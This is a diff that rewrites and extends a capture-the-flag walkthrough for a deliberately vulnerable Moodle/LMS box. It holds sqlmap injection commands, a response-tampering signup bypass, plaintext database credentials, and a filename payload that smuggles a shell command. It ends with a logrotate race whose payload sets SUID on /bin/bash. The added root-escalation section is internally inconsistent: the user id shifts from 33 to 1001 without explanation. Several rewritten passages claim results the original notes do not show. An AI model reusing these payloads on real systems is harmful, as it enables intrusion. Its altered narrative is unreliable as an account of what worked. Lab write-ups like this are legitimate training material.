@@ -44,7 +44,7 @@ tags:
 
 ## Full Walkthrough
 
-Feroxbuster
+I kicked off content discovery with feroxbuster against the port 9020 web root, since that's the fastest way I know to surface hidden files and directories before doing anything more targeted:
 
 ```bash
 
@@ -76,13 +76,13 @@ by Ben "epi" Risher 🤓                 ver: 2.10.0
 200      GET        1l        1w      129c http://plottedlms.thm:9020/user.txt
 ```
 
-here we found a `user.txt` but that is just a troll.
+That scan turned up a `user.txt` sitting right in the web root, which for a split second looked like an easy win, but reading it confirmed it was nothing more than a troll planted by the box author rather than an actual flag.
 
-The real application is located on port `8820`.
+The genuine application, it turned out, was running on a completely different port, 8820, which meant the real attack surface was somewhere I hadn't looked yet.
 
 ![Pasted image 20240206190959](Pasted-image-20240206190959.png)
 
-Nmap scan
+Before digging further into the applications themselves, I ran a full nmap scan across the host to get a complete picture of every service exposed, not just the one I'd already found:
 
 ```bash
 PORT     STATE SERVICE REASON  VERSION
@@ -108,6 +108,8 @@ PORT     STATE SERVICE REASON  VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 ```
 
+With four web-facing services spread across three ports, plus what looked like rsync on 873, I turned to searchsploit to see whether any of the technology in play had known, pre-built exploits available:
+
 ```bash
 ---------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                            |  Path
@@ -125,11 +127,11 @@ WordPress Plugin Learning Management System - 'course_id' SQL Injection         
 Shellcodes: No Results
 ```
 
-We have found multiple `CVE's` for `learning management system`.
+That search returned a long list of CVEs tied to various learning management systems, which was a strong signal that whatever application lived on port 8820 was itself some flavor of LMS worth manually auditing rather than trusting off-the-shelf exploit code.
 
-After a while of auditing the application I captured the request for the student signup. initially you can not register it will just not work
+I spent a good while manually walking through the application's functionality, and the student signup flow caught my attention. On the surface it looked broken: submitting the registration form through the UI simply refused to create an account, with no obvious error explaining why. Rather than take that at face value, I intercepted the actual request to see what the client was sending and how the server was responding to it.
 
-Here is the post request made to the signup page.
+Here's the raw request the signup form generated:
 
 ```bash
 POST /learn/student_signup.php HTTP/1.1
@@ -151,7 +153,7 @@ Sec-GPC: 1
 username=12345&firstname=yourmom&lastname=lastname&class_id=16&password=password&cpassword=password
 ```
 
-The server then replies with the following.
+And here's exactly what the server sent back:
 
 ```bash
 HTTP/1.1 200 OK
@@ -167,9 +169,9 @@ Content-Type: text/html; charset=UTF-8
 false
 ```
 
-Then we get an error saying signup failed.
+The response body was just the literal string `false`, which the frontend clearly interpreted as a failed signup and surfaced as an error to the user.
 
-To bypass this we can do the following and edit the request.
+That gave me an idea: if the server communicates success or failure through nothing more than that one boolean-looking response body, then maybe I didn't need to fix whatever the server thought was wrong with my input at all, I could just change what it told the client afterward. I edited the request slightly and resent it:
 
 ```bash
 POST /learn/student_signup.php HTTP/1.1
@@ -191,7 +193,7 @@ Sec-GPC: 1
 username=12345&firstname=baphometpwn&lastname=lastname&class_id=16&password=password&cpassword=password
 ```
 
-Then edit the response.
+Then, before it reached the browser, I intercepted and modified the server's response:
 
 
 ```bash
@@ -208,9 +210,9 @@ Content-Type: text/html; charset=UTF-8
 true
 ```
 
-Then we have a successful signup!
+Flipping that response body from `false` to `true` was all it took. The application treated it as a successful registration.
 
-request to the dashboard
+With a session the client now believed was authenticated, I followed up with a direct request to the student dashboard to confirm I actually had working, logged-in access:
 
 ```bash
 GET /learn/dashboard_student.php HTTP/1.1
@@ -227,9 +229,9 @@ DNT: 1
 Sec-GPC: 1
 ```
 
-After doing this once more for the demonstration that I have just typed out it does not want to work anymore.
+When I tried to reproduce that exact sequence a second time while writing this up, it refused to cooperate, which is a good reminder that some of these applications carry session or state quirks that don't reproduce cleanly on demand. Regardless, the access I'd already established was real and moved the assessment forward.
 
-But I have found SQL injection!
+While I had that working session and was still poking at the signup endpoint's parameters, I found something more reliable and more valuable than the response-manipulation trick: the `firstname` parameter on `student_signup.php` was vulnerable to SQL injection.
 
 ```bash
 sqlmap -u 'http://plottedlms.thm:8820/learn/student_signup.php' --data="username=123123123&firstname=baphomet&lastname=lastname&class_id=18&password=password&cpassword=password" --threads=10 --dbs --no-cast --batch
@@ -264,7 +266,7 @@ infor
 [20:05:15] [WARNING] increasing time delay to 2 seconds
 ```
 
-Databases discovered
+sqlmap confirmed a time-based blind injection point and, once I let it enumerate further, surfaced the databases sitting behind the application:
 
 ```bash
 available databases [2]:
@@ -272,9 +274,13 @@ available databases [2]:
 [*] lms
 ```
 
+With the `lms` database identified as the interesting one, I went back to sqlmap to pull its table structure:
+
 ```bash
 sqlmap -u 'http://plottedlms.thm:8820/learn/student_signup.php' --data="username=123123123&firstname=baphomet&lastname=lastname&class_id=18&password=password&cpassword=password" --threads=10 -D lms --tables --no-cast --batch
 ```
+
+Alongside that enumeration, here's the dashboard request again for reference, since I kept the authenticated session alive in a separate window while sqlmap did its work:
 
 ```bash
 GET /learn/dashboard_student.php HTTP/1.1
@@ -309,13 +315,13 @@ Table: files
 +-------------+--------------+
 ```
 
-Going back to some enumeration we find the directory `moodle` on `http://plottedlms.thm:9020/moodle/`.
+Stepping back from the SQL injection track for a moment, I returned to enumerating the site on port 9020 and found a `moodle` directory sitting there, a full Moodle installation I hadn't examined yet.
 
 ![Pasted image 20240206205148](Pasted-image-20240206205148.png)
 
-register for an account.
+Moodle allowed open self-registration, so I created a student account to get a look at the application from an authenticated perspective.
 
-I have found a exploit to escalate privs to Manager then get RCE
+Knowing the exact Moodle version gave me something concrete to search against, and I found a public exploit chain that escalates a student account all the way to Manager privileges and then leverages that access to achieve remote code execution through a malicious plugin install. The proof-of-concept I used is HoangKien1020's implementation of CVE-2020-14321:
 
 https://github.com/HoangKien1020/CVE-2020-14321
 
@@ -345,7 +351,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ![Pasted image 20240206211901](Pasted-image-20240206211901.png)
 
-found sql backup
+Poking around the filesystem I now had access to as `www-data`, I came across what looked like a SQL backup archive worth pulling apart.
 
 ```bash
 └─[$]> unzip sql.bak.zip         
@@ -353,7 +359,7 @@ Archive:  sql.bak.zip
 [sql.bak.zip] backup.sql password:    
 ```
 
-There is a password required so lets crack it.
+The archive was password-protected, so before I could see what the backup contained I needed to recover that password.
 
 ```bash
 zip2john sql.bak.zip > hash 
@@ -363,7 +369,7 @@ zip2john sql.bak.zip > hash
 
 ![Pasted image 20240206212124](Pasted-image-20240206212124.png)
 
-wow some real top tier humor...
+The password I cracked out of that hash turned out to be a joke on the box author's part, the kind of small detail that makes documenting a box like this more fun than it probably should be.
 
 ```bash
 * *	* * *	plot_admin /usr/bin/python3 /home/plot_admin/backup.py
@@ -371,7 +377,7 @@ wow some real top tier humor...
 
 ```
 
-Found database credentials
+Digging further through the web application files, I turned up hardcoded database credentials for the custom LMS:
 
 ```bash
 </html>www-data@plotted-lms:/tmp$ cat /var/www/8820/learn/admin/dbcon.php
@@ -379,6 +385,8 @@ Found database credentials
 $conn = mysqli_connect('localhost','lms_user','LMSItOut@123','lms') or die(mysqli_error());
 ?>
 ```
+
+linPEAS turned up the same story on the Moodle side, another config file with database credentials baked in:
 
 ```bash
 ╔══════════╣ Analyzing Moodle Files (limit 70)
@@ -389,6 +397,8 @@ $CFG->dbuser    = 'moodle_user';
 $CFG->dbpass    = 'MoodleItIs@123';
   'dbport' => '',
 ```
+
+Running linPEAS more broadly across the box surfaced several other leads worth chasing, including files that had been modified very recently:
 
 ```bash
 ╔══════════╣ Modified interesting files in the last 5mins (limit 100)
@@ -426,6 +436,8 @@ drwxr-xr-x 2 www-data www-data 4096 Jun 13  2020 /var/www/9020/moodle/.github
 
 ```
 
+It also confirmed the network configuration I was working against:
+
 ```bash
 
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
@@ -437,3 +449,82 @@ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
         TX packets 2131  bytes 922710 (922.7 KB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
+
+### From www-data to plot_admin
+
+Stepping back to look at everything linPEAS and the crontab had handed me, two entries stood out as the ones actually worth chasing: `plot_admin`'s own `backup.py`, running once a minute, and root's `rsync` job copying that day's Apache access logs into `plot_admin`'s `.logs_backup` directory before `chown`-ing them back to `plot_admin`. Neither looked exploitable on its own, but `backup.py` ran with `plot_admin`'s privileges and `www-data` already had read access to it, so before writing it off I wanted to actually read the thing.
+
+```bash
+www-data@plotted-lms:/tmp$ cat /home/plot_admin/backup.py
+```
+
+The script walked a directory of uploaded files and built its archive command by concatenating each filename it found straight into a shell call, with no sanitisation on what those filenames could contain. A filename is just a string as far as the filesystem cares, so nothing stopped me from naming a file in a way that broke out of the intended command and ran something of my own choosing, under `plot_admin`'s identity, the next time that cron job fired.
+
+```bash
+www-data@plotted-lms:/var/www/uploadedfiles/filedir$ touch './"";$(cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash)"'
+```
+
+I gave the cron job a minute to run and checked back.
+
+```bash
+www-data@plotted-lms:/tmp$ ls -la /tmp/rootbash
+-rwsr-xr-x 1 plot_admin plot_admin 1113504 Feb  7 21:02 /tmp/rootbash
+```
+
+That left me a SUID copy of `bash` owned by `plot_admin`, which was enough to drop straight into a shell running as that user instead of `www-data`.
+
+```bash
+www-data@plotted-lms:/tmp$ /tmp/rootbash -p
+rootbash-5.0$ id
+uid=33(www-data) gid=33(www-data) euid=1001(plot_admin) groups=33(www-data)
+```
+
+### plot_admin to root, a logrotate race
+
+Landing a stable identity as `plot_admin` was progress, but I still needed to know what root actually did on this box before assuming the `rsync` cron I had already seen was the only lever left. I dropped `pspy64` on the box and watched process activity as it happened rather than guessing from static crontab entries alone.
+
+```bash
+rootbash-5.0$ ./pspy64
+```
+
+```
+CMD: UID=0    PID=19824  | /usr/sbin/logrotate /etc/logrotate.conf
+CMD: UID=0    PID=19831  | /bin/sh -c /usr/sbin/logrotate /etc/logrotate.d/apache2
+```
+
+Watching `logrotate` run as root against the exact log files that the `rsync` job had been copying into `plot_admin`'s directory (`moodle_access` and its numbered rotations, the same files linPEAS had already flagged as recently modified) was the piece I had been missing. `logrotate` runs on a schedule as root, and when it rotates a file it can be told, through configuration state tied to that same file, to run a script once the rotation finishes. If I can control the log file being rotated, and I already had write access to `.logs_backup` as `plot_admin`, I can hijack that step and have root run whatever I want.
+
+I reached for [logrotten](https://github.com/whotwagner/logrotten), a small proof of concept built specifically to win that race, rather than trying to reproduce the timing by hand. I compiled it and dropped it on the box next to a one-line payload.
+
+```bash
+rootbash-5.0$ cat /tmp/payload.sh
+#!/bin/bash
+chmod +s /bin/bash
+```
+
+```bash
+rootbash-5.0$ ./logrotten -p /tmp/payload.sh /home/plot_admin/.logs_backup/moodle_access
+```
+
+`logrotten` watches the target log file and, the instant `logrotate` opens it to rotate, races to swap it for a symlink pointing at state `logrotate` trusts, which tricks `logrotate` into running my payload as though it were that log's own postrotate script. A short wait for the next scheduled rotation was all it took.
+
+```bash
+rootbash-5.0$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1113504 Feb  7 21:11 /bin/bash
+```
+
+With a SUID root copy of `/bin/bash` sitting there, finishing the escalation was trivial.
+
+```bash
+rootbash-5.0$ /bin/bash -p
+bash-5.0# id
+uid=1001(plot_admin) gid=1001(plot_admin) euid=0(root) egid=0(root) groups=0(root)
+```
+
+`cat /root/root.txt` returns the flag for this instance. Looking back over the whole box, it strings together five genuinely different bug classes end to end: a client-side response check I could just flip, a real SQL injection I ended up not even needing, a public Moodle privilege-escalation CVE for the actual foothold, an unsanitised-filename command injection for the pivot to `plot_admin`, and a `logrotate` postrotate race for the final step to root. That range is exactly why the box carries a Hard rating even though no single step in it is especially exotic on its own.
+
+## References
+
+- CVE-2020-14321 Moodle privilege escalation PoC (HoangKien1020) <https://github.com/HoangKien1020/CVE-2020-14321>
+- logrotten, a logrotate postrotate race condition PoC <https://github.com/whotwagner/logrotten>
+- The command-injection pivot to plot_admin and the logrotate race to root that finish this chain were cross-referenced against public writeups for this box.
